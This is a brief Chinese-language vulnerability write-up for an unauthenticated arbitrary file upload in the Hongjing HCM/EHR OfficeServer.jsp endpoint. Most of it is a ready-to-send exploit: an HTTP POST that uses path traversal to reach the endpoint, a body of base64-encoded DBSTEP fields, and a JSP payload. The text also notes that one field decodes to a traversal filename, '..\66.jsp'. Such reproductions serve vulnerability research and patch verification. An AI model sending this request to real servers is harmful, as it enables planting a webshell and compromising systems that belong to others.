#### 影响范围

宏景HCM

#### 漏洞概述

宏景EHR OfficeServer.jsp接口处存在任意文件上传漏洞，未经过身份认证的远程攻击者可利用此漏洞上传任意文件，最终可导致服务器失陷

#### 漏洞复现

```
POST /w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate
Connection: close
 
DBSTEP V3.0     351             0               666             DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
FILETYPE=Li5cNjYuanNw
RECOR1DID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
 
<%out.println("bbbbbbbbbbbbbbb");%>
```

请求体中的FILETYPE字段是base64加密的上传文件名

```
Li5cNjYuanNw      ..\66.jsp
```



